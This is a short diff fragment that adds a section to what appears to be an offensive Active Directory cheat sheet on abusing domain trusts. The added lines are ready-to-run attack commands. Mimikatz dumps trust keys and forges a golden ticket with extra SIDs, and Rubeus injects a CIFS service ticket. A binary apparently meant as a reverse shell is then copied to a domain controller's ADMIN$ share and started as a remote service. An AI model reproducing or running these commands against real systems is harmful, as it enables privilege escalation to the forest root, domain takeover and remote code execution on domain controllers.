@@ -5137,6 +5137,18 @@ Connect to DC01
 ```c
 Enter-PSSession DC01
 ```
+##### Other option for Domain Trus
+https://offensive.run/winecosystem/6trust/README.html 
+
+```c
+./mimikatz.exe "lsadump::trust /patch" "exit" //retrieve the rc4_hmac_nt value of one of the “CHILD.TARGET.COM -> TARGET.COM
+.\mimikatz.exe "kerberos::golden /user:Administrator /domain:$SRC_DOMAIN /sid:$SRC_SID /sids:$DST_SID /rc4:$KRBTGT_RC4 /service:krbtgt /target:$DST_DOMAIN /ticket:golden.kirbi" exit
+.\Rubeus.exe asktgs /ticket:golden.kirbi /dc:"$DST_HOSTNAME.$DST_DOMAIN" /service:"CIFS/$DST_HOSTNAME.$DST_DOMAIN" /nowrap /ptt
+
+copy rever32.exe '\\DC01.TARGET.COM\ADMIN$\rever32.exe'
+sc.exe \\DC01.TARGET.COM create pototo binPath="c:\Windows\rever32.exe"
+sc.exe \\DC01.TARGET.COM start pototo
+```
 
 ##### Skeleton Key
 
